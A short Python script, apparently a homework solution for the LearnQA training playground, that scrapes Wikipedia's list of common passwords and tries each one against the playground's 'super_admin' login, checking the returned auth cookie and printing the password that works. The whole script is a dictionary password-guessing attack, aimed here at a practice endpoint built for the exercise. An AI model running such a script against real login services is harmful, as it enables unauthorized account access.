import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = list(set(tree.xpath(locator)))

for password in passwords:
    password = str(password).strip()
    payload = {"login": "super_admin", "password": f"{password}"}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {}
    cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text == 'You are authorized':
        print(f"Пароль: {password}")
        print(response2.text)

